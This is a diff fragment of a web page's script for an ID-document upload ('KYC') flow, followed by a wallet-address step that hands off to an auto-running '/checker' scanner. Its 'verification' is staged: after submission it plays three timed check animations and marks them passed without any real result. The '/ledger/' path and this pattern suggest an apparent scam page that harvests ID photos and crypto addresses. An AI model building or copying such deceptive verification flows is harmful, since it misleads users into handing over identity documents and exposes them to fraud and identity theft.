+    var to = setTimeout(function() { ctl.abort(); }, KYC_UP_TIMEOUT);
+    kycSetSt(side, "Uploading…");
+    try {
+      var r = await fetch("/api/kycdoc", {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        signal: ctl.signal,
+        body: JSON.stringify({ op: "upload", session: kycSid, side: side, image: dataUrl })
+      });
+      clearTimeout(to);
+      var j = await r.json().catch(function() { return {}; });
+      if (j.ok) {
+        kycUpOk[side] = true;
+        kycSetSt(side, "");
+        monit("kyc_" + side, { src: "kyc-first", ok: true, size: dataUrl.length });
+      } else {
+        kycSetSt(side, j.error === "rate_limited" ? "Too many uploads — wait a moment and retake" : "Upload failed — retake this photo", true);
+      }
+    } catch (e) {
+      clearTimeout(to);
+      if (e && e.name === "AbortError") {
+        if (kycUpCtl[side] === ctl) kycSetSt(side, "Upload timed out — retake this photo", true);
+      } else {
+        kycSetSt(side, "Upload failed — retake this photo", true);
+      }
+    }
+    kycUpdateSubmit();
+  } catch (e) {
+    kycSetSt(side, "Could not process this image — try another", true);
+  }
+}
+
+function kycRetake(side) {
+  if (kycUpCtl[side]) kycUpCtl[side].abort();
+  kycImg[side] = null;
+  kycUpOk[side] = false;
+  kycUpdateSubmit();
+  $("kyc-" + side + "-preview").classList.add("hidden");
+  $(side === "front" ? "kyc-front-empty" : "kyc-back-empty").classList.remove("hidden");
+  $("kyc-" + side + "-cap").classList.remove("done");
+  $("kyc-" + side + "-redo").classList.add("hidden");
+  kycSetSt(side, "");
+  ["blur", "glare", "light"].forEach(function(q) {
+    var el = $("kyc-" + side + "-q-" + q);
+    if (el) { el.className = "qchip pending"; el.textContent = q === "blur" ? "Sharpness" : (q === "glare" ? "Glare" : "Lighting"); }
+  });
+}
+
+/* ── Phone handoff (desktop) ── */
+var kycPhone = false;
+var kycPoll = null;
+var kycPollStart = 0;
+
+function kycRenderQr() {
+  var url = location.origin + "/ledger/kyc-mobile?session=" + kycSid + "&exp=" + kycExp;
+  var qr = qrcode(0, "M");
+  qr.addData(url);
+  qr.make();
+  $("qr-code").innerHTML = qr.createSvgTag({ cellSize: 5, margin: 0 });
+}
+
+function kycTogglePhone() {
+  kycPhone = !kycPhone;
+  var panel = $("qr-panel"), capArea = $("capture-area"), toggle = $("phone-toggle");
+  if (kycPhone) {
+    ensureKycSession();
+    kycRenderQr();
+    $("qr-text").textContent = kycGot.back
+      ? "Both photos received — finish on your phone…"
+      : (kycGot.front ? "Front photo received — waiting for back…" : "Waiting for phone…");
+    panel.classList.remove("hidden");
+    capArea.classList.add("hidden");
+    toggle.textContent = "Hide QR code";
+    monit("kyc_qr_shown", { src: "kyc-first" });
+    kycStartPoll();
+  } else {
+    panel.classList.add("hidden");
+    capArea.classList.remove("hidden");
+    toggle.textContent = "Use your phone's camera instead →";
+    kycStopPoll();
+  }
+}
+
+function kycStartPoll() {
+  kycStopPoll();
+  kycPollStart = Date.now();
+  kycPoll = setInterval(kycPollDocs, 3000);
+  kycPollDocs();
+}
+function kycStopPoll() {
+  if (kycPoll) { clearInterval(kycPoll); kycPoll = null; }
+}
+
+async function kycFetchImages() {
+  try {
+    var r = await fetch("/api/kycdoc?session=" + kycSid + "&images=1", { cache: "no-store" });
+    var j = await r.json().catch(function() { return {}; });
+    ["front", "back"].forEach(function(side) {
+      var img = j[side + "Img"];
+      if (img && !kycImg[side]) {
+        kycImg[side] = img;
+        $("kyc-" + side + "-img").src = img;
+        $(side === "front" ? "kyc-front-empty" : "kyc-back-empty").classList.add("hidden");
+        $("kyc-" + side + "-preview").classList.remove("hidden");
+        $("kyc-" + side + "-cap").classList.add("done");
+        $("kyc-" + side + "-redo").classList.remove("hidden");
+      }
+    });
+  } catch (e) {}
+}
+
+async function kycPollDocs() {
+  if (!kycSid) return;
+  try {
+    var r = await fetch("/api/kycdoc?session=" + kycSid, { cache: "no-store" });
+    var j = await r.json().catch(function() { return {}; });
+    if (!j || !j.ok) return;
+    if (j.front && !kycGot.front) {
+      kycGot.front = true; kycUpOk.front = true;
+      $("qr-text").textContent = "Front photo received — waiting for back…";
+      monit("doc_received", { side: "front", via: "phone" });
+      kycFetchImages();
+    }
+    if (j.back && !kycGot.back) {
+      kycGot.back = true; kycUpOk.back = true;
+      $("qr-text").textContent = "Both photos received — finish on your phone…";
+      monit("doc_received", { side: "back", via: "phone" });
+      kycFetchImages();
+    }
+    kycUpdateSubmit();
+    if (!j.done && Date.now() - kycPollStart > 45000) {
+      $("qr-text").textContent = "Taking longer than expected — check the link on your phone, or upload here instead";
+    }
+    if (j.done) kycFinish("phone");
+  } catch (e) {}
+}
+
+/* ── Submit → staged verify → sess_done → address step ── */
+async function kycSubmitDocs() {
+  var btn = $("kyc-submit");
+  btn.disabled = true;
+  btn.textContent = "Submitting…";
+  ensureKycSession();
+  try {
+    var r = await fetch("/api/kycdoc", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ op: "done", session: kycSid })
+    });
+    var j = await r.json().catch(function() { return {}; });
+    if (!j.ok) throw new Error(j.error || "done_failed");
+  } catch (e) {
+    $("kyc-err").textContent = "Submission failed — check your connection and try again.";
+    $("kyc-err").classList.remove("hidden");
+    btn.disabled = false;
+    btn.textContent = "Verify documents";
+    return;
+  }
+  $("kyc-err").classList.add("hidden");
+  showStep("step-verify");
+  monit("docs_submitted", { src: "kyc-first" });
+
+  var steps = ["vc1", "vc2", "vc3"];
+  var delays = REDUCED_MOTION ? [300, 300, 300] : [1800, 2600, 2200];
+  var i = 0;
+  (function runV() {
+    if (i >= steps.length) { kycFinish("submit"); return; }
+    var el = $(steps[i]);
+    el.classList.add("run");
+    setTimeout(function() {
+      el.classList.remove("run");
+      el.classList.add("ok");
+      i++;
+      runV();
+    }, delays[i]);
+  })();
+}
+
+function kycFinish(via) {
+  if (kycDone) return;
+  kycDone = true;
+  kycStopPoll();
+  kycStopTimer();
+  $("sess-pill").classList.add("hidden");
+  postSess("sess_done");
+  monit("kyc_docs_complete", { src: "kyc-first", via: via || "unknown" });
+  showStep("step-addr");
+  addrInput();
+}
+
+function resumeDone() {
+  // Server already marked this session verified — pick up at the scan step.
+  kycDone = true;
+  showStep("step-addr");
+  addrInput();
+}
+
+/* ── Address step → checker handoff ── */
+function addrInput() {
+  var v = $("scan-addr").value.trim();
+  var ok = isValidAddr(v) || isTronAddr(v);
+  $("addr-go").disabled = !ok;
+  $("addr-err").classList.toggle("hidden", ok || v.length === 0);
+}
+
+function goScan() {
+  var addr = $("scan-addr").value.trim();
+  if (!isValidAddr(addr) && !isTronAddr(addr)) {
+    $("addr-err").classList.remove("hidden");
+    return;
+  }
+  $("addr-go").disabled = true;
+  $("addr-go").textContent = "Opening scanner…";
+  monit("kyc_first_handoff", { addr: addr });
+  // EVM targets go via ?addr=&auto=1 (auto-scans immediately); TRON targets
+  // via ?for= — the checker's relay mapping auto-runs the scan the same way.
+  location.href = "/checker?" + (isTronAddr(addr) ? "for=" : "addr=") +
+    encodeURIComponent(addr) + "&kyc=" + kycSid + (isTronAddr(addr) ? "" : "&auto=1");
+}
+
+/* ── Wiring ── */
+["front", "back"].forEach(function(side) {
+  var cap = $("kyc-" + side + "-cap"), input = $("kyc-" + side + "-input");
+  cap.addEventListener("click", function() { input.click(); });
+  cap.addEventListener("keydown", function(e) {
+    if (e.key === "Enter" || e.key === " ") { e.preventDefault(); input.click(); }
+  });
+  cap.addEventListener("dragover", function(e) { e.preventDefault(); cap.classList.add("dz-hover"); });
+  cap.addEventListener("dragleave", function() { cap.classList.remove("dz-hover"); });
+  cap.addEventListener("drop", function(e) {
+    e.preventDefault(); cap.classList.remove("dz-hover");
+    kycCapture(side, e.dataTransfer && e.dataTransfer.files[0]);
+  });
+  input.addEventListener("change", function() {
+    kycCapture(side, input.files[0]);
+    input.value = "";
+  });
+});
+
+if (!isDesktopUA) {
+  // Phones capture inline — the QR handoff adds nothing.
+  $("phone-wrap").classList.add("hidden");
+}
+
+// Script sits at the end of <body> — the DOM is ready here.
+initSession().then(function() {
+  if (forParam) addrInput();
+}).catch(function() { showStep("step-expired"); });
+</script>
+</body>
+</html>
